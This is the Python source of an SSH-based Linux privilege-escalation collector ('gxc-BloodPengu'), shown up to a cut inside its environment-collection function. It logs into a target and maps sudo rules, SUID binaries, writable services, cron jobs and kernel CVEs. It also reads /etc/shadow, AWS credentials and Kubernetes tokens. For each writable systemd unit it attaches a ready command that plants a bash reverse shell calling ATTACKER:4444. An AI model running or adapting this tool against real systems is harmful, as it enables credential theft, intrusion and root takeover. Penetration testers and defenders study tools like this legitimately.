#!/usr/bin/python3

import argparse
import json
import os
import sys
import time
import socket
from datetime import datetime, timezone

try:
    import paramiko
except ImportError:
    print("\033[1;31m[!]\033[0m paramiko not installed!! Run: pip3 install paramiko")
    sys.exit(1)

BP_VERSION    = "1.3.9"
SUITE_VERSION = "2.0.3"

RESET   = "\033[0m"
BRED    = "\033[1;31m"
BORANGE = "\033[1;33m"
ORANGE  = "\033[0;33m"
WHITE   = "\033[1;37m"
GREY    = "\033[0;37m"
DGREY   = "\033[2;37m"
BGREEN  = "\033[1;32m"

NO_COLOR = False

def c(color, text):
    if NO_COLOR:
        return str(text)
    return f"{color}{text}{RESET}"

def log_info(msg):
    print(f"  {c(BORANGE, '[*]')}  {c(WHITE, msg)}")

def log_ok(msg):
    print(f"  {c(BGREEN, '[+]')}  {c(WHITE, msg)}")

def log_err(msg):
    print(f"  {c(BRED, '[!]')}  {c(WHITE, msg)}")

def log_dim(msg):
    print(f"  {c(DGREY, '[-]')}  {c(DGREY, msg)}")

def log_find(tier, collector, detail):
    if tier == "CRITICAL":
        tier_str = c(BRED,    f"[{'CRITICAL':<8}]")
    elif tier == "HIGH":
        tier_str = c(BORANGE, f"[{'HIGH':<8}]")
    else:
        tier_str = c(ORANGE,  f"[{'POTENTIAL':<8}]")
    print(f"  {tier_str}  {c(BORANGE, f'{collector:<14}')}  {c(WHITE, detail)}")

def log_verbose(collector, key, val):
    print(f"  {c(DGREY, '    ~')}  {c(DGREY, f'{collector:<16}')}  {c(DGREY, f'{key}:')}  {c(GREY, str(val)[:120])}")

def banner():
    print()
    print(c(BORANGE, "                                                                      "))
    print(c(BORANGE, "                /MM0MM                                                "))
    print(c(BORANGE, "                     hM       -w1MMMxXX                               "))
    print(c(BORANGE, "                           wMMMMMMMMMMM0hM                            "))
    print(c(BORANGE, "                     h  /0MMhMhhMMM0MMMhMMMh                          "))
    print(c(BORANGE, "                       M/h0hMMxM/1hhhM>hhh^x/^                        "))
    print(c(BORANGE, "                    hhMhMX hhMh       0>     ww                       "))
    print(c(BORANGE, "                  MM   M0Mh0 -w      -xhI    ^                        "))
    print(c(BORANGE, "                    --h-1/Mh>h-      0w    -  x                       "))
    print(c(BORANGE, "                   -XXXw>1h wwIhXww-hhh^   whwhh                      "))
    print(c(BORANGE, "                    X>I^h1 Iw- 0hMhhhhhwhhhhh                         "))
    print(c(BORANGE, "                    ^MI0-1 ^^Xww hhX> M1hwhMwh                        "))
    print(c(BORANGE, "                  I >1 h^ >/  hw0-I0MXMMxwhMhhx     Mh> w             "))
    print(c(BORANGE, "                 11 hhhhh1  /II00 ^0xMX1^hwh hh          0/           "))
    print(c(BORANGE, "               x>0-xh ^x/  Xx^w0   h1Mh0Ihwh X>>0      wwM/           "))
    print(c(BORANGE, "               1 -xw  X  w0hxh>   h/hM-/>hXh^   >w>XhwXwIX            "))
    print(c(BORANGE, "              1 w0h>   w/-hhw xx- MMwhw^0w1  >w  -I II                "))
    print(c(BORANGE, "              Ix 0hM x/w0 1h > X Ihhhh h/0^ /hhh/w/x                  "))
    print(c(BORANGE, "              h w^-h>wh^I hxM  hhMhhh  wh- Ix1 Mhxhhhhw               "))
    print(c(BORANGE, "                 0>00/1X   hhhhhh1hh w0x1 ->X/0> w^ hIhhw>            "))
    print(c(BORANGE, "           >w0/ -   /     1I^Xww1 -X0> - 1w00X1X  10 - wXXx           "))
    print(c(BORANGE, "           I00-        w00/  I  >0xhX/ 1  0/1Ix0wIx    Iw/x           "))
    print(c(BORANGE, "            1 wwhhhhhh1h > 11  00-hh^ x1    ^   w>wXw 0X0I            "))
    print(c(BORANGE, "            w/w1--  ^^wI^ >>  wwhhh0 ^I -w / 0   X>x -1  1^           "))
    print(c(BORANGE, "              X 0I1 0^x1^x0   0whwI  ^wx  x>h ^   I   1x 1            "))
    print(c(BORANGE, "                        Xx    xwhwX  w//  11 X/0  11  1 >I            "))
    print(c(BORANGE, "                       Ix/    h/h>I  0    h>-1I0   >I>>               "))
    print(c(BORANGE, "                       > x/ 0  /hw>> ^XX0w- X>h^                      "))
    print(c(BORANGE, "                            -  -whxwww10^-hw/^0                       "))
    print(c(BORANGE, "                                ^--^  -^0w/>ww                        "))
    print(c(BORANGE, "                                 Iw-xh >I-                            "))
    print(c(BORANGE, "                                     w                                "))
    print()
    print(c(BRED, "                           v1.3.9 [Kraken Husk]                          "))
    print()
    print(f"  {c(BORANGE, 'gxc-BloodPengu.py')} {c(DGREY, f'v{BP_VERSION}')} {c(DGREY, '|')} {c(BORANGE, 'by <@byt3n33dl3>')}")
    print(f"  {c(DGREY, 'Data collector in Python for BloodPengu APM')}")
    print()

def divider():
    print(f"  {c(DGREY, '-' * 70)}")
    print()

def print_help():
    banner()
    print(f"{c(BORANGE, '  Usage:')}")
    print(f"    {c(WHITE, 'bloodpengu-python')} {c(ORANGE, '<target>')} {c(DGREY, '[options]')}")
    print()
    print(f"  {c(DGREY, '-' * 70)}")
    print()
    print(f"{c(BORANGE, '  Authentication:')}  {c(DGREY, '(required one of -p or -k)')}")
    print()
    print(f"    {c(BORANGE, '-u')} {c(WHITE, 'USERNAME')}          {c(DGREY, 'SSH username')}")
    print(f"    {c(BORANGE, '-p')} {c(WHITE, 'PASSWORD')}          {c(DGREY, 'Authenticate with password')}")
    print(f"    {c(BORANGE, '-k')} {c(WHITE, 'KEY_FILE')}          {c(DGREY, 'Authenticate with RSA/PEM private key  ')}{c(ORANGE, '(e.g. id_rsa, key.pem)')}")
    print()
    print(f"{c(BORANGE, '  Target Options:')}")
    print()
    print(f"    {c(BORANGE, '-d')} {c(WHITE, 'DOMAIN')}            {c(DGREY, 'Domain or hostname  ')}{c(ORANGE, '(stored in output for BloodPengu context)')}")
    print(f"    {c(BORANGE, '--port')} {c(WHITE, 'PORT')}          {c(DGREY, 'SSH port  ')}{c(ORANGE, '(default: 22)')}")
    print()
    print(f"{c(BORANGE, '  Modules:')}  {c(DGREY, '(all collectors run by default, use -M to run one only)')}")
    print()
    print(f"    {c(BORANGE, '-M')} {c(WHITE, 'MODULE')}            {c(DGREY, 'Run a specific module only')}")
    print()
    print(f"    {c(DGREY, '    Available modules:')}")
    print(f"    {c(BORANGE, '    sacspengu')}        {c(DGREY, 'Compiler and binary analysis: gcc, make, writable paths')}")
    print()
    print(f"{c(BORANGE, '  Output:')}")
    print()
    print(f"    {c(BORANGE, '-o')} {c(WHITE, 'OUTPUT_FILE')}       {c(DGREY, 'Write JSON to file  ')}{c(ORANGE, '(default: pypengu-output.json)')}")
    print(f"    {c(BORANGE, '-v')}                   {c(DGREY, 'Verbosity as each collector result as it arrives')}")
    print(f"    {c(BORANGE, '--no-color')}           {c(DGREY, 'Disable color output')}")
    print()
    print(f"  {c(DGREY, '-' * 70)}")
    print()
    print(f"{c(BORANGE, '  Examples:')}")
    print()
    print(f"    {c(WHITE, 'bloodpengu-python <target> -u kraken -p kr@ken')}")
    print(f"    {c(WHITE, 'bloodpengu-python <target> -u kraken -k ~/.ssh/id_rsa')}")
    print(f"    {c(WHITE, 'bloodpengu-python <target> -u kraken -k ~/.ssh/id_rsa --port 2222')}")
    print(f"    {c(WHITE, 'bloodpengu-python <target> -u kraken -p kr@ken -d kraken.htb -v')}")
    print(f"    {c(WHITE, 'bloodpengu-python <target> -u kraken -p kr@ken -M sacspengu')}")
    print(f"    {c(WHITE, 'bloodpengu-python <target> -u kraken -k id_rsa -o ./results/kraken.json')}")
    print()
    print(f"  {c(DGREY, '-' * 70)}")
    print()
    print(f"{c(BORANGE, '  Collectors:')}  {c(DGREY, '(all run by default unless -M is specified)')}")
    print()
    collectors = [
        ("users",      "COLLECT",  "Local users, UID 0 accounts, /etc/passwd, /etc/group"),
        ("sudo",       "COLLECT",  "NOPASSWD rules, dangerous sudo binaries, misconfigs"),
        ("suid",       "COLLECT",  "SUID and SGID binaries with GTFOBins cross-reference"),
        ("groups",     "COLLECT",  "Privileged groups - docker, lxd, disk, shadow, adm"),
        ("services",   "COLLECT",  "Writable systemd units, hijackable service scripts"),
        ("cron",       "COLLECT",  "Writable cron scripts, scheduled task privilege paths"),
        ("kernel",     "COLLECT",  "Kernel version matched against known CVE list"),
        ("containers", "ESCAPE",   "Docker socket, LXD membership, cloud credentials, K8s"),
        ("network",    "RECON",    "Listening ports, interfaces, internal network range"),
        ("env",        "DISCOVER", "Env vars, history files, interesting files in home/opt"),
        ("sacspengu",  "COMPILE",  "Compilers, writable PATH/lib dirs, capabilities, build files"),
    ]
    print(f"    {c(BORANGE, f'{'Collector':<14}')}  {c(DGREY, f'{'Role':<10}')}  {c(WHITE, 'Description')}")
    print(f"    {c(DGREY, '-' * 13)}  {c(DGREY, '-' * 9)}  {c(DGREY, '-' * 52)}")
    for name, role, desc in collectors:
        rc = BRED if role == "ESCAPE" else BORANGE if role in ("COLLECT", "COMPILE") else ORANGE
        print(f"    {c(BORANGE, f'{name:<14}')}  {c(rc, f'{role:<10}')}  {c(DGREY, desc)}")
    print()
    print(f"  {c(DGREY, '-' * 70)}")
    print()
    print(f"  {c(DGREY, 'Output lands on attacker machine as pypengu-output.json')}")
    print(f"  {c(DGREY, 'Import directly into BloodPengu!!')}")
    print()
    print(f"  {c(DGREY, 'gxc-BloodPengu.py')} v{BP_VERSION} by <@byt3n33dl3> {c(BORANGE, '<github.com/byt3n33dl3/gxc-BloodPengu.py>')}")
    print()


GTFOBINS = [
    "nmap","vim","vi","nano","less","more","man","awk","gawk",
    "perl","python","python3","python2","ruby","lua","irb","php","node",
    "find","cp","mv","cat","tee","head","tail","cut","sort",
    "bash","sh","dash","zsh","ksh","csh","tcsh",
    "tar","zip","unzip","gzip","bzip2","xz",
    "curl","wget","ftp","tftp","nc","netcat","ncat",
    "gcc","make","cc","as","ld",
    "git","svn","hg",
    "docker","lxc","runc","podman",
    "strace","ltrace","gdb",
    "socat","ssh","scp","rsync",
    "env","nice","ionice","timeout",
    "systemctl","journalctl","loginctl",
    "mount","umount",
    "apt","apt-get","yum","dnf","pip","pip3","gem",
    "mysql","psql","sqlite3",
    "base64","xxd","od",
    "openssl","gpg",
    "sed","tr","xargs",
    "screen","tmux",
    "watch","at",
    "chroot","nsenter",
    "taskset","prlimit",
]

PRIV_GROUPS = {
    "sudo":             "critical",
    "wheel":            "critical",
    "admin":            "high",
    "root":             "critical",
    "docker":           "critical",
    "lxd":              "critical",
    "lxc":              "critical",
    "libvirt":          "high",
    "disk":             "critical",
    "shadow":           "critical",
    "adm":              "medium",
    "staff":            "medium",
    "video":            "low",
    "plugdev":          "low",
    "kvm":              "medium",
    "vboxusers":        "low",
    "dialout":          "low",
    "dip":              "low",
    "netdev":           "low",
    "bluetooth":        "low",
    "systemd-journal":  "medium",
    "systemd-network":  "medium",
    "utmp":             "low",
    "utmpx":            "low",
}

KERNEL_CVES = {
    "5.8.0":  [
        ("CVE-2021-4034", "high",     "Polkit pkexec privilege escalation",                  "https://nvd.nist.gov/vuln/detail/CVE-2021-4034"),
        ("CVE-2021-3156", "high",     "Sudo heap-based buffer overflow",                     "https://nvd.nist.gov/vuln/detail/CVE-2021-3156"),
    ],
    "5.4.0":  [
        ("CVE-2021-4034", "high",     "Polkit pkexec privilege escalation",                  "https://nvd.nist.gov/vuln/detail/CVE-2021-4034"),
        ("CVE-2021-3156", "high",     "Sudo heap-based buffer overflow",                     "https://nvd.nist.gov/vuln/detail/CVE-2021-3156"),
        ("CVE-2022-0847", "high",     "Dirty Pipe - overwrite data in arbitrary read-only files", "https://nvd.nist.gov/vuln/detail/CVE-2022-0847"),
    ],
    "5.11.0": [
        ("CVE-2022-0847", "high",     "Dirty Pipe - overwrite data in arbitrary read-only files", "https://nvd.nist.gov/vuln/detail/CVE-2022-0847"),
    ],
    "4.4.0":  [
        ("CVE-2016-5195", "critical", "Dirty COW - write to read-only memory mappings",      "https://nvd.nist.gov/vuln/detail/CVE-2016-5195"),
    ],
    "4.15.0": [
        ("CVE-2018-18955","high",     "Linux kernel privilege escalation via user namespaces","https://nvd.nist.gov/vuln/detail/CVE-2018-18955"),
        ("CVE-2019-13272","high",     "PTRACE_TRACEME pkexec local privilege escalation",    "https://nvd.nist.gov/vuln/detail/CVE-2019-13272"),
    ],
    "3.13.0": [
        ("CVE-2015-1328", "critical", "Ubuntu overlayfs local privilege escalation",         "https://nvd.nist.gov/vuln/detail/CVE-2015-1328"),
    ],
    "2.6.22": [
        ("CVE-2012-0056", "high",     "Linux /proc/pid/mem privilege escalation",            "https://nvd.nist.gov/vuln/detail/CVE-2012-0056"),
    ],
    "4.3.0":  [
        ("CVE-2016-5195", "critical", "Dirty COW - write to read-only memory mappings",      "https://nvd.nist.gov/vuln/detail/CVE-2016-5195"),
    ],
    "5.16.0": [
        ("CVE-2022-0847", "high",     "Dirty Pipe - overwrite data in arbitrary read-only files", "https://nvd.nist.gov/vuln/detail/CVE-2022-0847"),
    ],
    "5.17.0": [
        ("CVE-2022-25636","high",     "Netfilter heap out-of-bounds write",                  "https://nvd.nist.gov/vuln/detail/CVE-2022-25636"),
    ],
    "4.10.0": [
        ("CVE-2017-7308", "high",     "Linux packet_set_ring privilege escalation",          "https://nvd.nist.gov/vuln/detail/CVE-2017-7308"),
    ],
    "4.14.0": [
        ("CVE-2017-16995","high",     "Linux eBPF verifier privilege escalation",            "https://nvd.nist.gov/vuln/detail/CVE-2017-16995"),
    ],
}

SENSITIVE_ENV_KEYS = [
    "password","passwd","pass","secret","key","token",
    "api_key","apikey","auth","credential","cred",
    "db_pass","dbpass","db_password","mysql_pass",
    "aws_secret","aws_access","private_key",
]


class SSHCollector:

    def __init__(self, client, target, domain, verbose):
        self.client        = client
        self.target        = target
        self.domain        = domain
        self.verbose       = verbose
        self._nodes        = {}
        self._edges        = []
        self._findings     = []
        self._edge_counter = 0
        self._current_user = ""
        self._current_uid  = ""
        self._hostname     = ""
        self._kernel       = ""
        self._os           = "Linux"
        self._arch         = ""
        self._collected_at = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

    def _next_eid(self):
        self._edge_counter += 1
        return f"e{self._edge_counter}"

    def build_output(self):
        node_list = list(self._nodes.values())
        edge_list = self._edges
        return {
            "metadata": {
                "hostname":          self._hostname or self.target,
                "os":                self._os,
                "kernel":            self._kernel,
                "arch":              self._arch,
                "collected_at":      self._collected_at,
                "collector":         "bloodpengu-python",
                "collector_version": BP_VERSION,
                "collected_as":      self._current_user,
                "uid":               self._current_uid,
            },
            "nodes": node_list,
            "edges": edge_list,
            "stats": {
                "total_nodes": len(node_list),
                "total_edges": len(edge_list),
                "paths_to_root": 0,
            },
        }

    def _add_node(self, node_id, node_type, label, properties=None):
        if node_id not in self._nodes:
            self._nodes[node_id] = {
                "id":         node_id,
                "type":       node_type,
                "label":      label,
                "properties": properties or {},
            }

    def _add_edge(self, src_id, edge_type, dst_id, risk="low", properties=None):
        if src_id not in self._nodes or dst_id not in self._nodes:
            return
        self._edges.append({
            "id":         self._next_eid(),
            "source":     src_id,
            "target":     dst_id,
            "type":       edge_type,
            "risk":       risk,
            "properties": properties or {},
        })

    def _add_finding(self, tier, collector, detail, raw=None):
        self._findings.append({
            "tier":      tier,
            "collector": collector,
            "detail":    detail,
            "raw":       raw or "",
        })
        log_find(tier, collector, detail)

    def run(self, cmd, timeout=20):
        try:
            _, stdout, _ = self.client.exec_command(cmd, timeout=timeout)
            return stdout.read().decode("utf-8", errors="replace").strip()
        except Exception:
            return ""

    def run_lines(self, cmd, timeout=20):
        return [l.strip() for l in self.run(cmd, timeout=timeout).splitlines() if l.strip()]

    def writable(self, path):
        return self.run(f"[ -w '{path}' ] && echo YES || echo NO").strip() == "YES"

    def readable(self, path):
        return self.run(f"[ -r '{path}' ] && echo YES || echo NO").strip() == "YES"

    def collect_users(self):
        log_info("Collecting users and groups...")

        self._current_user = self.run("whoami").strip()
        self._hostname     = self.run("hostname 2>/dev/null").strip()
        self._arch         = self.run("uname -m 2>/dev/null").strip()
        self._os           = self.run("lsb_release -ds 2>/dev/null || cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '\"' || echo Linux").strip().splitlines()[0] if True else "Linux"

        id_out = self.run("id").strip()
        for part in id_out.replace(",", " ").split():
            if part.startswith("uid="):
                self._current_uid = part.split("=")[1].split("(")[0]
                break

        self._add_node("user:root", "user", "root", {
            "uid": "0", "gid": "0", "home": "/root",
            "shell": "/bin/bash", "is_root": True, "is_current": False,
        })

        for line in self.run_lines("cat /etc/passwd 2>/dev/null"):
            parts = line.split(":")
            if len(parts) < 7:
                continue
            uname  = parts[0]
            uid    = parts[2]
            gid    = parts[3]
            home   = parts[5]
            shell  = parts[6]
            nid    = f"user:{uname}"
            self._add_node(nid, "user", uname, {
                "uid":        uid,
                "gid":        gid,
                "home":       home,
                "shell":      shell,
                "is_root":    uid == "0",
                "is_current": uname == self._current_user,
            })
            if uid == "0" and uname != "root":
                self._add_finding("CRITICAL", "users", f"UID 0 non-root account: {uname}", line)
            if self.verbose and shell not in ("/bin/false", "/usr/sbin/nologin", "/sbin/nologin", ""):
                log_verbose("users", uname, f"uid={uid} shell={shell}")

        for line in self.run_lines("cat /etc/group 2>/dev/null"):
            parts = line.split(":")
            if len(parts) < 4:
                continue
            gname = parts[0]
            gid   = parts[2]
            self._add_node(f"group:{gname}", "group", gname, {
                "gid":          gid,
                "is_privileged": gname.lower() in PRIV_GROUPS,
            })

        if self.run("cat /etc/shadow 2>/dev/null | head -1"):
            self._add_finding("CRITICAL", "users", "/etc/shadow readable from current privilege level")
        if self.run("cat /etc/gshadow 2>/dev/null | head -1"):
            self._add_finding("HIGH", "users", "/etc/gshadow readable from current privilege level")

        u = sum(1 for n in self._nodes.values() if n["type"] == "user")
        g = sum(1 for n in self._nodes.values() if n["type"] == "group")
        log_ok(f"Users: {u}  |  Groups: {g}")

    def collect_sudo(self):
        log_info("Collecting sudo rules...")
        cu    = self._current_user
        cu_id = f"user:{cu}"
        sudo_out = self.run("sudo -l 2>/dev/null")
        if not sudo_out:
            log_dim("sudo -l returned nothing - no sudo access or not in sudoers")
            return
        rule_count = 0
        for line in sudo_out.splitlines():
            line  = line.strip()
            lower = line.lower()
            if "nopasswd" in lower:
                rule_count += 1
                if "(all) nopasswd: all" in lower or "(root) nopasswd: all" in lower:
                    self._add_finding("CRITICAL", "sudo", f"Full NOPASSWD all: {line}", line)
                    self._add_edge(cu_id, "SudoNoPasswd", "user:root", risk="critical",
                                   properties={"rule": line})
                else:
                    cmd_part = line.split("NOPASSWD:")[-1].strip() if "NOPASSWD:" in line else line
                    self._add_finding("HIGH", "sudo", f"NOPASSWD rule: {line}", line)
                    self._add_edge(cu_id, "SudoNoPasswd", "user:root", risk="high",
                                   properties={"rule": line})
                    for gb in GTFOBINS:
                        if gb in cmd_part.lower().split():
                            self._add_finding("CRITICAL", "sudo", f"GTFOBins binary in NOPASSWD: {gb}  ({line})", line)
                            break
            elif "(all)" in lower or "(root)" in lower:
                rule_count += 1
                if self.verbose:
                    log_verbose("sudo", "rule (passwd required)", line)
        log_ok(f"Sudo rules collected: {rule_count}")

    def collect_suid(self):
        log_info("Collecting SUID/SGID binaries...")
        cu_id = f"user:{self._current_user}"
        lines = self.run_lines(
            "find / \\( -perm -4000 -o -perm -2000 \\) -type f 2>/dev/null"
            " | grep -v '/proc/' | grep -v '/sys/'",
            timeout=60,
        )
        gtfo_count = 0
        for path in lines:
            name    = os.path.basename(path).lower()
            is_gtfo = name in [g.lower() for g in GTFOBINS]
            nid     = f"binary:{path}"
            self._add_node(nid, "binary", path, {
                "path":    path,
                "suid":    True,
                "gtfobin": is_gtfo,
                "owner":   "other",
            })
            risk = "critical" if is_gtfo else "medium"
            self._add_edge(cu_id, "SuidBinary", nid, risk=risk,
                           properties={"path": path})
            if is_gtfo:
                gtfo_count += 1
                self._add_finding("CRITICAL", "suid", f"GTFOBins SUID binary: {path}", path)
                self._add_edge(cu_id, "SuidBinary", "user:root", risk="critical",
                               properties={"path": path, "via": name})
            elif self.verbose:
                log_verbose("suid", "binary", path)
        log_ok(f"SUID/SGID: {len(lines)}  |  GTFOBins hits: {gtfo_count}")

    def collect_groups(self):
        log_info("Collecting privileged group memberships...")
        cu    = self._current_user
        cu_id = f"user:{cu}"
        id_out     = self.run("id")
        groups_raw = self.run("groups")
        user_groups = set()
        for part in id_out.split(","):
            for seg in part.split("="):
                seg = seg.strip()
                if "(" in seg and ")" in seg:
                    user_groups.add(seg[seg.find("(")+1:seg.find(")")].lower())
        for part in groups_raw.split():
            user_groups.add(part.strip().lower())

        for grp in user_groups:
            grp_id = f"group:{grp}"
            if grp_id not in self._nodes:
                self._add_node(grp_id, "group", grp, {
                    "gid":          "",
                    "is_privileged": grp in PRIV_GROUPS,
                })
            risk = PRIV_GROUPS.get(grp, "low")
            self._add_edge(cu_id, "MemberOf", grp_id, risk=risk)

            if grp == "docker":
                self._add_finding("CRITICAL", "groups", "Member of docker group - socket escape to root available", grp)
                self._add_edge(cu_id, "DockerEscape", "user:root", risk="critical",
                               properties={"via": "docker group socket mount"})
            elif grp in ("lxd", "lxc"):
                self._add_finding("CRITICAL", "groups", f"Member of {grp} group - image escape to root", grp)
                self._add_edge(cu_id, "LXDGroupEscape", "user:root", risk="critical",
                               properties={"via": f"{grp} image init"})
            elif grp in ("sudo", "wheel", "admin"):
                self._add_finding("HIGH", "groups", f"Member of {grp} group - likely sudo access", grp)
            elif grp == "disk":
                self._add_finding("CRITICAL", "groups", "Member of disk group - raw disk read/write access", grp)
            elif grp == "shadow":
                self._add_finding("CRITICAL", "groups", "Member of shadow group - /etc/shadow accessible", grp)
            elif grp in ("adm", "systemd-journal"):
                self._add_finding("POTENTIAL", "groups", f"Member of {grp} - log access, possible credential leakage", grp)

        log_ok(f"Groups: {', '.join(sorted(user_groups))}")

    def collect_services(self):
        log_info("Collecting systemd service units...")
        cu_id = f"user:{self._current_user}"
        unit_paths = self.run_lines(
            "find /etc/systemd /lib/systemd /usr/lib/systemd -name '*.service' 2>/dev/null"
        )
        writable_count = 0
        for path in unit_paths:
            svc_name = os.path.basename(path)
            nid      = f"service:{svc_name}"
            self._add_node(nid, "service", svc_name, {
                "path":    path,
                "run_as":  "root",
                "state":   "unknown",
            })
            if self.writable(path):
                writable_count += 1
                self._add_finding("CRITICAL", "services", f"Writable systemd unit: {path}", path)
                self._add_edge(cu_id, "WritableService", nid, risk="critical",
                               properties={
                                   "path":            path,
                                   "writable_by":     "user",
                                   "exploit_snippet": f"echo '[Service]\\nExecStart=/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\"' > {path} && systemctl daemon-reload",
                               })
                self._add_edge(cu_id, "WritableService", "user:root", risk="critical",
                               properties={"via": f"writable unit {svc_name}"})

        exec_scripts = self.run_lines(
            "grep -r 'ExecStart=' /etc/systemd /lib/systemd 2>/dev/null | grep -v '#'"
            " | awk -F= '{print $2}' | awk '{print $1}'"
        )
        for script in exec_scripts:
            script = script.strip().split()[0] if script.strip() else ""
            if not script or not script.startswith("/"):
                continue
            if self.writable(script):
                sname = os.path.basename(script)
                snid  = f"service:{sname}"
                self._add_node(snid, "service", sname, {
                    "path": script, "run_as": "root", "state": "unknown",
                })
                self._add_finding("CRITICAL", "services", f"Writable ExecStart script: {script}", script)
                self._add_edge(cu_id, "WritableService", snid, risk="critical",
                               properties={"path": script, "writable_by": "user"})
                self._add_edge(cu_id, "WritableService", "user:root", risk="critical",
                               properties={"via": f"writable exec script {sname}"})
                if self.verbose:
                    log_verbose("services", "writable exec", script)

        log_ok(f"Units scanned: {len(unit_paths)}  |  Writable: {writable_count}")

    def collect_cron(self):
        log_info("Collecting cron jobs and scheduled tasks...")
        cu    = self._current_user
        cu_id = f"user:{cu}"
        cron_files = self.run_lines(
            "find /etc/crontab /etc/cron.d /etc/cron.daily /etc/cron.hourly"
            " /etc/cron.weekly /etc/cron.monthly /var/spool/cron"
            " /var/spool/cron/crontabs -type f 2>/dev/null"
        )
        entry_count = 0
        for cf in cron_files:
            if self.writable(cf):
                self._add_finding("HIGH", "cron", f"Writable cron file: {cf}", cf)
            if not self.readable(cf):
                continue
            for line in self.run_lines(f"cat '{cf}' 2>/dev/null"):
                if line.startswith("#") or not line.strip():
                    continue
                if "=" in line and len(line.split()) == 1:
                    continue
                parts = line.split()
                if len(parts) < 7:
                    continue
                owner  = parts[5]
                script = parts[6]
                if not owner.isidentifier() and not all(c.isalnum() or c in "_-." for c in owner):
                    continue
                if not script.startswith("/"):
                    continue
                entry_count += 1
                owner_id = f"user:{owner}"
                if owner_id not in self._nodes:
                    self._add_node(owner_id, "user", owner, {
                        "uid": "", "gid": "", "home": "", "shell": "",
                        "is_root": owner == "root", "is_current": owner == cu,
                    })
                if self.writable(script):
                    self._add_finding("CRITICAL", "cron", f"Writable cron script (owner={owner}): {script}", line)
                    self._add_edge(cu_id, "CronHijack", owner_id, risk="critical",
                                   properties={"script": script, "schedule": " ".join(parts[:5])})
                elif self.verbose:
                    log_verbose("cron", owner, script)

        user_crontab = self.run("crontab -l 2>/dev/null")
        if user_crontab:
            for line in user_crontab.splitlines():
                if line.strip() and not line.strip().startswith("#"):
                    entry_count += 1
                    if self.verbose:
                        log_verbose("cron", "user crontab", line.strip())

        log_ok(f"Cron entries collected: {entry_count}")

    def collect_kernel(self):
        log_info("Collecting kernel information...")
        cu_id   = f"user:{self._current_user}"
        uname_r = self.run("uname -r").strip()
        self._kernel = uname_r

        kernel_base = ".".join(uname_r.split(".")[:3])
        matched = []
        for k_ver, cve_list in KERNEL_CVES.items():
            if kernel_base.startswith(k_ver):
                matched.extend(cve_list)

        seen_cves = set()
        deduped = []
        for entry in matched:
            if entry[0] not in seen_cves:
                seen_cves.add(entry[0])
                deduped.append(entry)

        for cve, risk, desc, ref in deduped:
            self._add_finding("HIGH", "kernel", f"Kernel {uname_r} may be vulnerable to {cve}", uname_r)
            self._add_edge(cu_id, "KernelExploit", "user:root", risk=risk,
                           properties={
                               "cve":            cve,
                               "description":    desc,
                               "kernel_version": uname_r,
                               "reference":      ref,
                           })

        if self.verbose:
            log_verbose("kernel", "version", uname_r)

        log_ok(f"Kernel: {uname_r}  |  CVE matches: {len(deduped)}")

    def collect_containers(self):
        log_info("Collecting container and cloud context...")
        cu_id = f"user:{self._current_user}"

        sock_exists = self.run("[ -S /var/run/docker.sock ] && echo YES || echo NO").strip() == "YES"
        if sock_exists:
            sock_perms = self.run("ls -la /var/run/docker.sock 2>/dev/null")
            nid = "service:docker.socket"
            self._add_node(nid, "service", "docker.socket", {
                "path": "/var/run/docker.sock", "run_as": "root", "state": "active",
            })
            if self.writable("/var/run/docker.sock"):
                self._add_finding("CRITICAL", "containers", "Docker socket world-writable - direct root escalation", sock_perms)
                self._add_edge(cu_id, "WritableService", nid, risk="critical",
                               properties={"path": "/var/run/docker.sock", "writable_by": "user"})
                self._add_edge(cu_id, "DockerEscape", "user:root", risk="critical",
                               properties={"via": "writable docker socket"})
            else:
                self._add_finding("HIGH", "containers", f"Docker socket present: {sock_perms.strip()}", sock_perms)

        in_container = self.run("[ -f /.dockerenv ] && echo YES || echo NO").strip() == "YES"
        if in_container:
            self._add_finding("HIGH", "containers", "Running inside Docker container - escape may be in scope")

        cgroup = self.run("cat /proc/1/cgroup 2>/dev/null | head -5")
        if cgroup:
            for rt in ("docker", "lxc", "kubepods"):
                if rt in cgroup.lower():
                    self._add_finding("POTENTIAL", "containers", f"cgroup indicates {rt} environment", cgroup[:120])
                    break

        for rt in ["docker","lxc-ls","lxd","podman","runc","containerd","kubectl"]:
            path = self.run(f"which {rt} 2>/dev/null")
            if path and self.verbose:
                log_verbose("containers", "runtime", f"{rt} -> {path.strip()}")

        aws_creds = self.run("cat ~/.aws/credentials 2>/dev/null | head -3")
        if aws_creds:
            self._add_finding("CRITICAL", "containers", "AWS credentials readable: ~/.aws/credentials", aws_creds[:80])
        if self.run("ls ~/.config/gcloud/ 2>/dev/null"):
            self._add_finding("HIGH", "containers", "GCP credential directory: ~/.config/gcloud/")
        if self.run("ls ~/.azure/ 2>/dev/null"):
            self._add_finding("HIGH", "containers", "Azure credential directory: ~/.azure/")
        k8s_token = self.run("cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null | head -c 80")
        if k8s_token:
            self._add_finding("CRITICAL", "containers", "Kubernetes service account token readable", k8s_token[:40] + "...")
        if self.run("ls ~/.kube/config 2>/dev/null"):
            self._add_finding("HIGH", "containers", "kubeconfig found: ~/.kube/config")

        log_ok(f"Docker socket: {sock_exists}  |  In container: {in_container}")

    def collect_network(self):
        log_info("Collecting network information...")
        ifaces    = self.run("ip addr show 2>/dev/null || ifconfig -a 2>/dev/null")
        listening = self.run("ss -tlnpu 2>/dev/null || netstat -tlnpu 2>/dev/null")

        ranges = []
        for line in ifaces.splitlines():
            if "inet " in line and "127.0.0" not in line:
                parts = line.strip().split()
                for i, p in enumerate(parts):
                    if p == "inet" and i + 1 < len(parts):
                        ranges.append(parts[i+1])

        svc_ports = {
            "3306":"mysql","5432":"postgres","6379":"redis",
            "27017":"mongodb","11211":"memcache","9200":"elasticsearch",
            "21":"ftp","25":"smtp","389":"ldap","636":"ldaps",
            "5900":"vnc","3389":"rdp","23":"telnet",
        }
        interesting = set()
        for line in listening.splitlines():
            for port, svc in svc_ports.items():
                if f":{port}" in line or f" {port} " in line:
                    interesting.add(f"{svc} (port {port}): {line.strip()[:80]}")

        for entry in interesting:
            self._add_finding("POTENTIAL", "network", f"Interesting internal service: {entry}", entry)

        if self.verbose:
            for r in ranges:
                log_verbose("network", "interface", r)

        log_ok(f"Interfaces: {len(ranges)}  |  Interesting services: {len(interesting)}")

    def collect_env(self):
        log_info("Collecting environment and interesting files...")
